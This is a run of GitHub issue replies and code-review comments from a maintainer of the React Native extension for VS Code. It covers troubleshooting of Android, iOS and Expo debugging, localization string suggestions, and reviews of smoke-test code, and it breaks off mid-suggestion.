issue https://github.com/Microsoft/vscode-react-native/issues/790, so I am closing this as duplicate.. Hi @nagnihotri and thanks for questioning. Did you check out View -> Toggle Output -> React Native, View -> Toggle Output -> React Native: Run android output windows as log message has suggested? What were the outputs?. Could you please still paste here output of View -> Toggle Output -> React Native, View -> Toggle Output -> React Native: Run android windows just after your attempt of debugging?  . Also, please update you first message with all the info from our issue template. @nagnihotri looks like this is not what I am expecting. Could you please copy paste the output from the following windows:\n\n\n. @nagnihotri okay, this is from View -> Toggle Output -> React Native window, but do you have any output from  View ->  Output -> React Native: Run android window? Could you please make a screenshot of it and copy the output too?. Well, that's strange, because error that you are describing happens only in the case when react-native run-android has failed and this window eventually should be appeared. Also, I noticed here https://github.com/Microsoft/vscode-react-native/issues/796#issuecomment-422050910 that you use npm run android in freshly created application, but android entry doesn't exist in scripts section of package.json file generated by react-native init command (at least on React Native 0.56). Could you please update your first message with all the information from our issue template so we could get more context of what are you trying to do?. @nagnihotri you still didn't give us information about your environment, RN version etc as already has been asked (https://github.com/Microsoft/vscode-react-native/issues/796#issuecomment-422429867, https://github.com/Microsoft/vscode-react-native/issues/796#issuecomment-422313528), so it is hard to make any further investigation without it. \nAlso, it is more likely that something wrong with your particular setup and not connected with the extension because as you said you are struggling to run your application even outside VS Code. Did you try to ask folks from https://github.com/facebook/react-native repo?. We are really sorry to see that situation, but just to summarize (correct me if I\u2019m not right) :\nYou are unable to run you app no matter with or without vscode extension, you get an error when you run react-native run-android.\nThis way it looks like this issue relates to react-native environment, not the extension team. I\u2019m closing the issue, but if you believe that this is somehow related to our extension - we are open for any discussion.. Hi @Bobozee and thanks for reaching us. We already have a fix for this (please see https://github.com/Microsoft/vscode-react-native/issues/790) that will be included in upcoming 0.6.17. Closing this as a duplicate.. Well, node_modules/.bin/gulp test:coverage implicitly runs it.. Hi @shahram, unfortunately, we don't have such an ability, so please file your issue to the correct issue tracker by yourself. . Hi @semenyakNik and thanks for your contribution. We've merged your changes with some slightly updates from our side so they will be included in upcoming release. I am closing this.. Hi @semenyakNik and thanks for your contribution! Could you please, resolve conflicts and, also, update npm-shrinkwrap.json file? Among these, all other changes are LGTM :+1: . Hi @reza7rm and thanks for reaching us. Please, add \"trace\": \"verbose\" to your debug configuration and try again - there will be more output in Debug Console. Please copy-paste it here.. @reza7rm could you please also share with us the following information:\n- Output of the React-Native output channel (View -> Toggle Output -> Select React-Native in ListBox)\n- Output of the Developer Tools console (Help -> Toggle Developer Tools -> Select Console tab). @reza7rm please copy output not from the LogCat-... channel, but from React-Native one as shown on the following screen:\n\n. Thanks for mentioning this @jlubeck! @reza7rm could you please, also, make sure that Debug Remote JS option is enabled in Dev menu of your application running on device/simulator?. @reza7rm do you have a chance to look at my comment? Just a friendly ping.. I am glad to hear that your problem was resolved. I am closing this then.. Hi @HCRenegade and thanks for your contribution :+1:  LGTM. #820 . Hi @VictDog and thanks for reaching us. Could you please run react-native run-ios --simulator --no-packager command in terminal and let us know if it works there? Also, please add \"trace\": \"verbose to your debug configuration and start debugging again. Then copy-paste information from Debug Console and React-Native output channel here.. @VictDog in addition to @SounD120's comment: do your application uses Expo SDK?. @VictDog just a friendly ping on this.. I am closing this due to inactivity. Please, feel free to open again if needed.. @dhanvikapila, could you please review it once again?. Hi @mjbvz and thanks for warning us. Could you please clarify the following items:\n Since which version of vscode package webview API was introduced?\n Since which version of VS Code it supports webview API?. @mjbvz thanks for reply. How can we get any logs from webview like console.log() outputs or maybe errors  outputs? Does it support it?. Hi @isidorn and thanks for your proposal. We have added it to our backlog and will pick it up in order of priorities. It is near the top so I think we will be able to work on it soon. Nevertheless, we need to investigate and discuss your suggestions with the team to make sure that everything will be fine in terms of user expirience. We will keep you posted.. Hey @isidorn, does something from your list is getting deprecated in nearest version of VS Code and we should take care of it ASAP?. @dhanvikapila, could you please review it?. Hi @The-Developeur and thanks for asking. Extension already support debugging in Expo. Please refer to this documentation section for more details. Also, be aware that Configuring Expo section is outdated, but we already proposed a PR with update, so if you need more information about advanced configuration, please, turn to it for now.\nPlease let us know, if you have any questions.. @hatton I could debug your application running on Windows machine and Android emulator without any problem. \n\nI'm looking for something obvious like in this reply but not seeing it, sorry!\n\nSo, did you try that solution? Did it help you?\nSorry if I confused you with my answer about the docs. The most recent documentation is in improve-docs branch and we are going to merge it soon. So for now, please turn to this documentation file for getting more details about how to debug Expo apps until it merged.. @Morriz seems to be that you have completely different case, please, submit separate issue.\n\nThat link is dead, \n\nThanks for pointing on that, changes from that PR already in master.\n@hatton do you still have a problems debugging Expo App? If not, i'd close this.. @Morriz please submit separate issue.. @hatton thanks for your reply. Do you experience the same issue now like in #846?\n@The-Developeur \n\nAnd in my .vscode Folder i don'y have launchReactNative.js\n\nTechnically debugger doesn't require .vscode/launchReactNative.js and this file is no longer being  generated inside .vscode. This is undocumented yet but the thing is that it couldn't be a reason for your problem. \nWhat OS do you use? What platform are you targeting: android or iOS? Are you running your app on real device or simulator/emulator?\n\n@hatton I hnow but when i select remote debuging expo said me i need chrome to allow me remote debuging\n\nCould you please show me a screenshot of that?. @hatton please see https://github.com/Microsoft/vscode-react-native/issues/846#issuecomment-443128583\n. @The-Developeur if you use Debug In Exponent configuration then you don't need to run expo start.\nAll you need to do is to run Debug In Exponent configuration, wait until QR code window appears, open Expo app on your device/simulator, scan or copy-paste qr code to your app, wait until app is loaded, open Developer Menu, enable remote js debugging and that's it. \nRegarding this error:\n\nCould you please give us exact reproduction steps for it and these logs:\n- Output of the Debug Console (View -> Toggle Debug Console):\nPASTE OUTPUT HERE\n- Output of the React-Native output channel (View -> Toggle Output -> Select React-Native in ListBox):\nPASTE OUTPUT HERE\n- Output of the Developer Tools console (Help -> Toggle Developer Tools -> Select Console tab):\nPASTE OUTPUT HERE\nAlso, please be aware, that there are some issues with logging in current version of VS Code 1.29, but in latest Insiders build these issues are resolved, so, please, use Insiders build for it.. @The-Developeur it's still not clear, what cause your problem. Could you please, share with us demo application so we could try to reproduce it on our side?\nAlso, please fill these items:\nSoftware versions\n\nReact-Native VS Code extension version: \nVSCode version: \nOS platform and version: \nNodeJS version: \nReact Native version: \nExpo SDK version (include if relevant):. @The-Developeur do you have a chance to look at this, please?. Hi @The-Developeur and sorry for delayed response. Your project works without any problems in my case. I  was able to reproduce your problem only once, when for some unknown reason all files except directories were missing in node_modules/react-native. I'd recommend you to remove node_modules directory and run npm install again. Please let me know if it helps.. Hi @ravirsrsrs and thanks for reaching us. Seems to be that your problem is related to Gradle or Flutter, but not to the extension. I suggest you to turn to Fultter support or Gradle support  pages as more relevant places for your question.\n\nif you still think that your issue somehow caused by the extension please let us know. In that case you might need to provide to us more details about your case, including demo project so we could reproduce it on our side.. Hi @rensutheart and thanks for letting us know. Nice catch!. Thanks for moving it here @Morriz. Have .vscode/exponentIndex.js file been created after the debugging session had stopped? Seems to be that packager could find it. Please, also, show us what debug configuration do you use and what app are you trying to debug: Expo one or pure React native one?. @hatton this file would be created if you tried to debug pure React Native application (not the Expo one) via Debug in Exponent configuration. The docs are telling you the same. That's why I asked @Morriz about what kind of app he's trying to debug.. @SounD120 please, make sure that there is no left dependencies, that we could update to resolve vulnerabilities issues. To do that run npm audit and go through the list. Please, pay attention, that possibly gulp version should be bumped to 4.0.0, because vscode-cordova has the same dependency and gulp@^3.9.1 was vulnerable.\nHere is the migration guide: https://www.liquidlight.co.uk/blog/article/how-do-i-update-to-gulp-4/. @SounD120 could you please update PR description with list of packages that remains vulnerable after merging this?. @SounD120 could you please add this to description?. Hi @AlexandreLouisnard and thanks for reaching us. \nThis is more likely a metro cache problem, please try to run rm -rf $TMPDIR/react-* && rm -rf $TMPDIR/metro* && rm -rf $TMPDIR/haste-* in addition to commands you already ran.. Hi @Mimetis and thanks for reaching us. I am facing this as well since yesterday and currently digging into it. I'll keep you posted.. @Mimetis btw what Expo SDK version is used in your project?. @Mimetis I mean not the expo cli version, but expo sdk version. Could you please copy-paste dependencies section of package.json?. @Mimetis thanks for the info. \ud83d\udc4d  I'll let you know about any news from my side.. Hi @Mimetis, issue was caused by bug in xdl package, latest version of which we dynamically install and then cache inside installed extension directory only when expo debug scenarios are being engaged. So, all folks who tried to use expo debugging in the extension for the first time two days ago (when the corrupted version 52.0.8 of xdl was released) are affected. Since 52.0.9 this problem is fixed.\nTo fix the issue you need to uninstall extension, restart VS Code (not just clicking on \"reload\" button on extension page) and install it again.\nAfter that debugging should work as usual.. @Mimetis please let me know whether it helps you or not.. Hi @supagu and sorry for delayed response. I tried to reproduce your problem on my Ubuntu 18 machine but It worked without any problems in my case. Here's my App.js snippet:\n```js\n/\n * Sample React Native App\n * https://github.com/facebook/react-native\n \n * @format\n * @flow\n /\nimport React, { Component } from 'react';\nimport { Platform, StyleSheet, Text, View } from 'react-native';\nconst instructions = Platform.select({\n  ios: 'Press Cmd+R to reload,\\n' + 'Cmd+D or shake for dev menu',\n  android:\n    'Double tap R on your keyboard to reload,\\n' +\n    'Shake or press menu button for dev menu',\n});\ntype Props = {};\nexport default class App extends Component {\n  render() {\n    fetch('https://facebook.github.io/react-native/movies.json')\n    .then(res => res.json())\n    .then((response) => { \n      console.log(\"fixtures retrieved:\"); console.log(response); \n    })\n    .catch((error) => { \n      console.error(error); \n    });\nreturn (\n  <View style={styles.container}>\n    <Text style={styles.welcome}>Welcome to React Native!</Text>\n    <Text style={styles.instructions}>To get started, edit App.js</Text>\n    <Text style={styles.instructions}>{instructions}</Text>\n  </View>\n);\n\n}\n}\nconst styles = StyleSheet.create({\n  container: {\n    flex: 1,\n    justifyContent: 'center',\n    alignItems: 'center',\n    backgroundColor: '#F5FCFF',\n  },\n  welcome: {\n    fontSize: 20,\n    textAlign: 'center',\n    margin: 10,\n  },\n  instructions: {\n    textAlign: 'center',\n    color: '#333333',\n    marginBottom: 5,\n  },\n});\n```\n\nCould you please share a small demo project with us?. btw @supagu are you using Haul? Is your issue similar to https://github.com/Microsoft/vscode-react-native/issues/875?. Okay, feel free to re-open it if needed.. @SounD120 Does it affect telemetry data or not yet?. hi @mustafahafidi and thanks for reaching us. Did you try solution from this https://github.com/Microsoft/vscode-react-native/issues/857#issuecomment-446605727?. Hi @devlinb and thanks for contacting us. Seems to be that you need to clean your metro bundler cache. Please try these commands and let us know if it helps:\nshell\ndel %TEMP%\\react-native-* & ^\ndel %TEMP%\\metro-cache* & ^\ndel %APPDATA%\\Temp\\react-native-* & ^\ndel %APPDATA%\\Temp\\metro-cache* & ^\ndel node_modules & ^\nnpm cache clean --force & ^\nnpm install. Hi @devlinb do you have a chance to look at this?. This is strange, usually such errors are related to Metro bundler cache issues or some specific misconfiguration. It's hard to say what is wrong without having any demo project. I tried to reproduce your issue on Windows (ENOENT issue particularly) and had no problem on basic tabs Expo app. I could even debug it with additional expo processes running (expo start) - extension started it's own packager instance on another port and worked without any trouble. Do you have an ability to provide a simple demo project so we could reproduce it on our side?. Hi @CrazzzyDev, I think multiroot demo project would be better.. Hi @The-Developeur, I think this is the better place for asking such questions as it's not related to the extension.. hi @supagu and thanks for questioning. In VS Code 1.29 were some problems with debug console outputs including not showing it if debugging session has not been started. Please, try to update to the VS Code 1.30 or higher where this problem is resolved.. Hi @Sakarisson and thanks for your contribution. PR builds from forks are being failed for now, as soon as we fix it, we'll merge it.. @Sakarisson sorry for delayed response.. hi @Sterlingryan and thanks for reaching us. Please, check that /Users/ryanaquilina/Library/Android/sdk\n/platform-tools/adb exists.. @Sterlingryan I just noticed that you have an extra space in the path just after sdk according to logs: /Users/ryanaquilina/Library/Android/sdk /platform-tools/adb. Could you please double check sdk.dir value in android/local.properties and your PATH?. Hi @znnnnn and thanks for questioning. Extension doesn't provide IntelISense for React Native anymore. I recommend you to file your issue to vscode repo as it's own all typings for React Native now.. Hi @harryharihar and thanks for reaching us. You didn't provide any details about your environment, so I am closing this issue due to lack of technical information. Please create a new one and next time fill all gaps in issue template.. Hi @fantasy525 and thanks for questioning. You can start packager once via palette command > React-Native: Start packager and then use Attach to packager debug configuration to connect to it.\nPlease let us know if it helps.. @fantasy525 could you please give us code snippet or demo project so we could take a look? Also, was something logged in React-Native output channel?. @fantasy525 debugger won't stop at 48 line because there is no statements at this line, but if you set breakpoint on 46,47 or 50 it should stop at them (assuming that this code would be ever reached). Did you try it? I see, that breakpoint at 47 line is gray and it's strange, do you use Haul packager?. Hi @harryharihar and thanks for submitting the issue. According to your logs you are trying to debug your application while another packager is running outside of VS Code. To be able to debug your app in VS Code you need to stop other packager instances and run Debug Android configuration or just use Attach to packager configuration to attach to running packager outside of VS Code.\nPlease let us know if this information is helpful.. Hi @harryharihar, do you have any more questions regarding this?. I am closing this due to inactivity. Feel free to re-open if needed.. Hi @PDostalek, it's partially translatable. These parts should not be translated:\n \"react-native run-{0}\"\n React Native. @PDostalek I updated my previous comment.. Hi @PDostalek do you need any more help from my side? . Hi @PDostalek, we log this message when extension is going to download JS bundle from packager by URL. In other words, the alternative phrase would be Are going to download: {0}.. Hi @PDostalek do you need any more help from my side? . Hi @mlostekk and thanks for contacting us. Do you use nvm?. > Also when trying to use your recommended setting, i see thi\n\n\n\nTo override RNT settings please use react-native-tools.SETTING, where SETTING is parameter you want to override? in your case it'd be projectRoot:\n\n\nYes, it was always working fine.. till 2 weeks ago\n\nPlease, try to run node -v command in system terminal outside VS Code and using VS Code terminal. If versions are different then run nvm alias default NODE_VER, where NODE_VER is needed version  of node, restart VS Code and check again.\nPlease let us know if it helps.\n. @mlostekk did you install react-native-cli globally for v8.15.0?. Hi @fantasy525 and thanks for reaching us. Is it https://github.com/fantasy525/fantasy-music project? Is it ready to be used by us to reproduce your problem? Do you have any instructions for us to how get started with it?. Hi @PDostalek please translate as per the source.. @PDostalek I am closing this, feel free to re-open if needed.. Hi @PDostalek looks like you are missing some text in \u201c,\u201d \u201c\u201d.. @PDostalek I marked in bold those parts that are localizable:\nShake or press menu button\nDev Settings\nDebug Server host & port for Device. hi @khpang94 and thanks for reaching us. Are you experiencing this while running via react-native run-android?. Hi @brendanmc6, nice catch \ud83d\udc4d ! Thanks a lot for fixing that. It would prevent others from making mistakes in their configuration.. Hi @lfiorini and thanks for reporting, I confirm that this is a bug due to changes in RN 0.59. I am working on a fix now and will let you know about any updates from our side.. @lfiorini  v0.9.0 has been released in which this issue should be resolved. I am closing this for now, please, feel free to reopen if needed.. ~~Hi @TeamAntani and thanks for reaching us. Could you please try to manually run react-native run-android and let us know if problem is still persist?~~. @TeamAntani oh, now I see. Thanks for your feedback, we'll consider that and manage in order of priorities. As workaround, you can try to use Attach to packager debug configuration.. This is React Native regression, fix is already proposed. As soon as RN folks merge it and release new @react-native-community/cli version issue will be fixed automatically after reinstallingnode_modules directory.. Version 1.4.6 is released, issue is closed.. @dhanvikapila could you please review changelog, in particular changelog wording?. Does these changes relate with PR goals? I don't see much sense of them to be introduced.. I believe, that message should be renamed to None of possible entry points index.js or index.${platform}.js exist. Skip prewarming.... @iTOYS I won't do that because I believe we have small amount of users that didn't update their VS Code instances to the latest version. So I just bumped vscode version to the minimum version that allows us to use null as second parameter for getConfiguration method. In real life, I think that indeed insignificant amount of users are still using v1.20, but we didn't know that for sure and we should keep required vscode version at the minimum. That's my point.. @iTOYS oh, now that makes sense to me, thanks for clarifications.. @iTOYS Because we need some methods not from core fs module, but from util module fileSystem.. @iTOYS yes, we can indeed, thanks for pointing to this!. @iTOYS could you please clarify what is the point? We haven't showDevMenu and reloadApp methods in the common interface. \nActually, that was the reason for me to not do things that you are suggesting.. @iTOYS \nhttps://github.com/Microsoft/vscode-react-native/pull/754/files/85c625d30da82ad693f52a9687be87615ca5154e#diff-0d185dabb7af8a387b988133ca5ca4d8R184\nhttps://github.com/Microsoft/vscode-react-native/pull/754/files/85c625d30da82ad693f52a9687be87615ca5154e#diff-0d185dabb7af8a387b988133ca5ca4d8R177. Seems to be that there is a typo: configutationFolder.. @lrkwz thanks for your suggestion, but I would change this to \"or the device using the one from output of adb devices\"  to make it more clear to users. If you have any doubts/concerns please let me know.. @lrkwz no problem.. Could you please change this to Return changes from 0.6.14-0.6.15 as more correct variant?. @SounD120 thanks for pointing out. I would change this to \"React Native: Run Element Inspector\" for more transparency to user.. Please, fix indentations. Please always use brackets { } even for single line statements. Could you please fix indentation issues in this file?. Could you please remove : in category section for consistency with other entries?. @dhanvikapila Yes, it should work, otherwise it's an VS Code issue. Also, please, be aware that menu will not be shown unless you already have launch.json - VS Code opens this file instead.. @dhanvikapila Sure, I'll take care of it.. Please clarify, why do we need to enable scripts for this page? According to this docs, we shouldn't allow this unless it's really needed:\nhttps://code.visualstudio.com/docs/extensions/webview#_limit-capabilities\nAlso, please go through against all the options that you use and make sure that each of them are required in our case.. Please clarify why did you make this change? Is the CancellationToken is redundant?. @dhanvikapila Yes, it will.. @dhanvikapila there is no metrics for now, but I could add it. Should I?. @dhanvikapila yes, of course.. @dhanvikapila Well, there is a caveat - actually, we need user to be logged in only in some case like when he is going to use tunelling (e.g. which allows devices outside of your LAN to access the the above servers without you needing to change your firewall settings) instead of LAN, or when he is going to publish his app to Expo. The thing is that is hard to detect such cases and, eventually, ask user to log in only when it needed, so that's why we are asking them to log in every time. I don't know how to correctly describe this in docs in terms of debugging instructions and user experience. Do you have any thoughts?. @SounD120 Seems to be, you forgot to add event-stream to devDependecies.. @SounD120 Could you please add comments for each of the new gulp tasks with short description of what it does?. suggestion\n            this.logger.warning(localize(\"PackagerNotFound\", \"Packager not found\"));. suggestion\n                return localize(\"ExecutingCommand\", \"Executing command: {0}\", command);. suggestion\n                return localize(\"FinishedExecutingCommand\", \"Finished executing: {0}\", command);. suggestion\n                throw new Error(localize(\"UnsupportedCommandStatus\", \"Unsupported command status\"));. suggestion\n                : Q.reject<string>(localize(\"CouldNotParseVersion\", \"Couldn't parse the version component of the package at {0}: version = {1}\", this.informationJsonFilePath(), version)));. suggestion\n                this.logger.info(localize(\"PackagerStarted\", \"Packager started.\"));. suggestion\n                this.logger.info(localize(\"PackagerIsAlreadyRunning\", \"Packager is already running.\"));. suggestion\n                    this.logger.info(localize(\"AboutToGetURL\", \"About to get: {0}\", bundleURL));. suggestion\n            return Q.reject<string>(localize(\"ThePackageOpnWasNotFound\", \"The package 'opn' was not found. \") + err);. Could you please, clarify what is the point of this change?. Could you please, clarify what is the point of this change?. Could you please, clarify what is the point of this change?. Seems to be there is no reason for using loggedOutput at all. I'd remove it.. Looks like this line is pointless.. The last callback seems to be unnessesary.. suggestion\n        }, error => printDebuggingError(localize(\"FailedToPrepareJSRuntimeEnvironment\", \"Failed to prepare the JavaScript runtime environment. Message:\\n{0}\", message), error));. suggestion\nexport interface InternalErrorArgument {\nThe reason is that adding I for interface names is not a rule in this repo.. suggestion\n    constructor(errorCode: number, message: string, errorLevel: InternalErrorLevel = InternalErrorLevel.Error, errorArgs?: IInternalErrorArgument[]) {. suggestion\n    constructor(errorCode: number, message: string, innerError: any = null, errorArgs?: IInternalErrorArgument[], errorLevel: InternalErrorLevel = InternalErrorLevel.Error) {. I would make isPii optional and consider it to false if it's not specified implicitly.. Do we really need to pass error message as argument?. Do we really need to pass error message as argument?. Do we really need to pass error message as argument?. Do we really need to pass error message as argument?. Do we really need to pass error message as argument?. suggestion\n    private static formatErrorMessage(errorMessage: string, ...optionalArgs: IInternalErrorArgument[]): string {. What is the point of changing this to es5 syntax?. What is the point of changing this to es5 syntax?. What is the point of changing this to es5 syntax?. Please, make sure that after replacing RangeError with InternalError code behaves the same way.. Are you sure we need to localize this? Could you please reproduce the situation when assert is occured and see what will you get in VS Code logs?. @SounD120 alright then. Can we simplify it to just use ErrorString class?. Would this condition work correctly after localization of error?. Is it okay, that this line is deleted?. suggestion\n        CommandPaletteHandler.logger.info(localize(\"PublishingAppToExponentServer\", \"Publishing app to Expo server. This might take a moment.\"));. suggestion\n            CommandPaletteHandler.logger.warning(localize(\"ExpoErrorOccuredMakeSureYouAreLoggedIn\", \"An error has occured. Please make sure you are logged in to Expo, your project is setup correctly for publishing and your packager is running as Expo.\"));. suggestion\n        this.logger.info(localize(\"MakingSureYourProjectUsesCorrectExponentDependencies\", \"Making sure your project uses the correct dependencies for Expo. This may take a while...\"));. suggestion\n                    const outputMessage = localize(\"ApplicationIsRunningOnExponentOpenToSeeIt\", \"Application is running on Expo. Open your Expo app at {0} to see it.\", this.exponentTunnelPath);. suggestion\n        this.logger.info(localize(\"ApplicationIsRunningOnExponentShakeDeviceForRemoteDebugging\", \"Application is running on Expo. Please shake device and select 'Debug JS Remotely' to enable debugging.\"));. suggestion\n            this.logger.warning(localize(\"iosRelativeProjectPathOptionIsDeprecatedUseRunArgumentsInstead\", \"'iosRelativeProjectPath' option is deprecated. Please use 'runArguments' instead.\"));. suggestion\n        let message = localize(\"QRCodeInstructions\", \"Expo is running. Open your Expo app at<br/><span style=\\\"text-decoration: underline\\\">{0}</span><br/>or scan QR code below:\", stringUri);. suggestion\n    registerVSCodeCommand(context, \"showDevMenu\", ErrorHelper.getInternalError(InternalErrorCode.CommandFailed, localize(\"ReactNativeShowDevMenu\", \"React Native: Show Developer Menu for app\")), () => CommandPaletteHandler.showDevMenu());. suggestion\n    [InternalErrorCode.WinRNMPPluginIsNotInstalled]: localize(\"WinRNMPPluginIsNotInstalled\", \"'rnpm-plugin-windows' is not installed.\"),. suggestion\n    [InternalErrorCode.AndroidCouldNotInstallTheAppOnAnyAvailibleDevice]: localize(\"AndroidCouldNotInstallTheAppOnAnyAvailibleDevice\", \"Could not install the app on any available device. Make sure you have a correctly \\n configured device or emulator running. See https://facebook.github.io/react-native/docs/android-setup.html.\"),. suggestion\n            console.error(ErrorHelper.getInternalError(InternalErrorCode.SourcesStoragePathIsNullOrEmpty).message);. suggestion\n        }. suggestion\n    grep: \"(debuggerContext|localizationContext)\", // Do not run tests intended for the debuggerContext and localizationContext. suggestion\n        test(\"localize should show correct message on Russian on CommandFailed error\", (done: MochaDone) => {. suggestion\n        test(\"localize should show correct message on Russian for iOSDeployNotFound error\", (done: MochaDone) => {. Are you sure, that everyone have rights for doing this?. You need to update package-lock.json as well.. suggestion\nThe extension supports running through Exponent not just the applications created with Expo but even pure React Native applications (in that case you may need to add expo package to devDependencies in order to make it work with Expo: `npm install --save-dev expo`). In either cases it uses `app.json` configuration file in the root of the project.. No.. Do we really need to use transifexId here?. suggestion\n        log(path.join(options.location, id, 'vscode-extensions', `${translationExtensionName}.xlf`));. Well, okay.. suggestion\n    // TODO Fix lint issues in smoke tests\n    \"!test/smoke/**\". Copyrights must appear in every .ts file, that's why we must not omit copyright check for smoke tests directory.. Please, check that all of these dependencies are required. Remove the ones that are redundant.. suggestion\n        // Other parts of code might steal focus away from quickopen :(. Do you really need this if you already have have 5 retries? . @SounD120 could you please clarify, do underlying app.workbench.* methods logs info about themselves during their calls? I mean if we call app.workbench.explorer.openFile, would a log like Opening file file.js be written?. Please, add type for returning value of the function.. Just a note: cb is more widely used shortening for callback.. Just a note: cb is more widely used shortening for callback.. suggestion\n        });. Please do not use one lettered variables, use more obvious naming like cb, callback, err, error.. suggestion\nconst workspaceFilePath = path.join(workspacePath, \"src\", \"App.js\");. For discussion: may be we should create and use separate resources directory inside tests/smoke directory? . Could you please clarify what does this parameter mean?. suggestion\n        fail(`Can't find VS Code executable at ${testVSCodeExecutableFolder}.`);. suggestion\n    console.log(\"*** Preparing smoke tests setup...\");. suggestion\n    console.log(\"*** Smoke tests setup done!\\n\");. Do we really need \\n at the end of the string?. suggestion\n        // Ensure that running over custom extensions directory, rather than picking up the one that was used by a tester previously. Smoke tests should be compiled as well, isn't it? Could you please clarify why did you exclude them?. suggestion\n    console.log(`*** Creating RN app via 'react-native init ${appName}' in ${workspacePath}...`);. Please clarify, what would happen if prepareReactNativeApplication fails?. \nsuggestion. ```suggestion\nconst remote = require(\"gulp-remote-src-vscode\");\n. Looks like a redundant change.suggestion\nexport function installExtensionFromVSIX(extensionDir: string, testVSCodeExecutablePath: string, resourcesPath: string, isInsiders: boolean) {\n. Please usejs\n{\n  throw new Error(React Native extension .vsix is not found in ${resourcesPath});\n}\ninstead.suggestion\n    const codeExecutableScript = isInsiders ? \"code-insiders\" : \"code\";\n.suggestion\n    console.log(*** Installing ${extensionFile} into ${extensionDir} using ${testVSCodeExecutablePath} executable);\n. Please wrap it with `{`, `}` instead.. Are you sure, that emulator would be always named as `emulator-5554`?.suggestion\n    let devices = cp.execSync(\"adb devices\", {stdio: \"inherit\"}).toString().trim();\n. Please remove `\\r\\n\\r\\n` because it wouldn't work as expected on Linux due to `\\n` is used on it. . Please, add comment to the function, that it is expected that only one emulator is being terminated. . @SounD120 Please, do it :).suggestion\nconst androidEmulatorName = emulator-${androidEmulatorPort};\n.suggestion\n.suggestion\n// Terminates emulator \"emulator-PORT\" if it exists, where PORT is 5554 by default\n. May be we should specify a complete url for that, because it's hard to understand where doc/debugging.md is located when you see this notice inside VS Code?. Could you please add comments to the each step describing what is happening in it? Here and further.. Do we have typings for this?.suggestion\n                    console.log(*** Check if app is being installed with command 'adb shell pm list packages ${appPackage}' for ${retry} time);\n. To prevetn memory leak, please, call `clearTimeout()`. Also, I'd create a helper method for this. . Please, add `clearInterval` here.suggestion\n    public static async enableRemoteDebugJSForRN(client: wdio.Client): Promise {\n. To prevent memory leak, please, call `clearTimeout()`. Are you sure that 300 ms is enough for command to execute?. Please, add comment what this command does.. Should we throw an error instead? That'd signalize in our test that something has been changed in basic application without making us to guess.. Is 1000 mean 100s?. Please avoid magic constants like \"9\", \"emulator-5554\". I'd recommend you to create constants class that contains such constants with their descriptions in comments.. Please avoid magic constants like \"9\", \"emulator-5554\". I'd recommend you to create constants class that contains such constants with their descriptions in comments.. Please move \"drop-win\" to parameter - it is changed on Linux and mac.. Please move it to class constants.. To prevetn memory leak, please, call `clearTimeout()`.. Are you sure this is a good name for log directory? Won't it be confused with Azure DevOps build artifacts?. Please move it to constants. Why didn't you update package-lock.json?.suggestion\n            // This command enables RN Dev Menu\n. Look like this command opens Dev Menu only for Android. This function seems to be shared between android and iOS tests so we need to make it cross platform. .suggestion\n// Default code of android platform version which is being targeted during the tests.\n// 9 = Android Pie\n.suggestion\npublic static defaultTargetAndroidPlatformVersion = \"9\";\n.suggestion\n// Default target emulator name \"emulator-\" + port\n.suggestion\npublic static defaultTargetAndroidDeviceName = \"emulator-5554\";\n.suggestion\n// Timeout for smoke tests setup\n.suggestion\n// Timeout for emulator boot\n.suggestion\n// Timeout for Spectron to wait for UI elements response to interaction\n.suggestion\n// Timeout for enabling Remote JS Debugging while testing RN app\n.suggestion\npublic static emulatorLoadTimeout = 90 * 1000;\n.suggestion\npublic static smokeTestSetupAwaitTimeout = 10 * 60 * 1000;\n.suggestion\npublic static emulatorLoadTimeout = 90 * 1000;\n.suggestion\npublic static spectronElementResponseTimeout = 150 * 1000;\n.suggestion\npublic static enableRemoteJSTimeout = 30 * 1000;\n.suggestion\n// Timeout for Android app to build and to install\n.suggestion\npublic static androidAppBuildAndInstallTimeout = 100 * 1000;\n. I'd left it inside the test class because this constant will be used only there..suggestion\npublic static smokeTestSetupTimeout = 10 * 60 * 1000;\n.suggestion\n// Test timeout\n.suggestion\n    this.timeout(smokeTestsConstants.smokeTestSetupTimeout);\n. @SounD120 yes, this is required by tsc. @SounD120 done \ud83d\ude03 .suggestion\n        // and modified a little bit\n. I switched to sandbox to avoid global stubbing between tests (like for `ReactNativeProjectHelper`). Otherwise, it leads to errors..suggestion\n                    // If no scheme were provided via runOptions.scheme then try to get scheme using the way RN CLI does.\n.suggestion\n    // Gets Expo URL from VS Code Expo QR Code tab\n. Are you sure this function should be in Debug helper?.suggestion\n// Time for Android Debug Test before it reaches timeout\n.suggestion\n// Time for Android Expo Debug Test before it reaches timeout\n.suggestion\n            console.log(\"Android Debug test: Starting debugging\");\n.suggestion\n            assert.notStrictEqual(found, false, \"\\\"Test output from debuggee\\\" string is missing in debug console\");\n.suggestion\n            console.log(\"Android Debug test: Debugging is stopped\");\n.suggestion\n            console.log(\"Android Debug test: \\\"Test output from debuggee\\\" string is found\");\n            await app.workbench.debug.stopDebugging();\n.suggestion\n            console.log(\"Android Debug test: Debugging is stopped\");\n.suggestion\n            console.log(\"Android Debug test: \\\"Test output from debuggee\\\" string is found\");\n            await app.workbench.debug.stopDebugging();\n.suggestion\n            assert.notStrictEqual(found, false, \"\\\"Test output from debuggee\\\" string is missing in debug console\");\n.suggestion\n            // Wait for debug string to be rendered in debug console\n.suggestion\n    public static async checkIfAppIsInstalled(appPackage: string, waitTime: number, waitInitTime?: number) {\n.suggestion\n        console.log(*** Copying ${expoURL} to system clipboard...);\n. I think we can extract this to separate function..suggestion\n    const customEntryPointFile = path.join(resourcesPath, \"ExpoSample\", \"App.js\");\n.suggestion\n    const launchConfigFile = path.join(resourcesPath, \"launch.json\");\n.suggestion\n    const vsCodeConfigPath = path.join(workspacePath, \".vscode\");\n.suggestion\n// Installs Expo app on Android device via \"expo start\" command\n. Do we really need to use `expo android` command? Can't we use `expo install:android`?.suggestion\n    await appiumHelper.checkIfAppIsInstalled(expoPackageName, 100 * 1000);\n. I'd add here a small delay for process to stop..suggestion\n            clearTimeout(timer);\n.suggestion\n            resolve();\n```. Why can't we use the same format everywhere in the tests? It'd help us to avoid confusion and need to go to variable declaration everytime to check what format it uses.. > I agree, but seems that Spectron gets waitTime in seconds\nOkay, then.. suggestion\n            await app.workbench.debug.continue(); // second continue() is needed because BP is being hit for two times for unknown reason. suggestion\n            await sleep(10 * 1000);. suggestion\n            let found = await app.workbench.debug.findStringInConsole(\"Test output from debuggee\", 10 * 1000);. 38-61 lines should be shifted to the left for 4 spaces. suggestion\nexport async function getLatestSupportedRNVersionForExpo(): Promise<any> {. suggestion\n    const latestRNVersionExpo = await 